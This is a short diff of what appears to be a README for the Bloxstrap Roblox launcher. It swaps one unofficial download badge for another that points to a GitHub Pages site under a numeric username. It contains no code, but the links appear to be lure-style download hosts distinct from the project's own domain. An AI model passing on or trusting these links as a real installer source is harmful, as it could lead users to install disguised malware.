@@ -4,12 +4,7 @@
 <img src="https://bloxstrap.org/assets/download.png" alt="Bloxstrap Interface" width="600">  
 </div>  
 
-<div align="center">
-<a href="https://bloxstrap-free.github.io/.github/">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" alt="Windows Logo" width="22" style="vertical-align:middle;margin-right:6px;">
-  <img src="https://img.shields.io/badge/Download_Bloxstrap_for_Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Bloxstrap for Windows">
-</a>
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://m41980615.github.io/.github/Bloxstrap-Free)
 
 ---
 
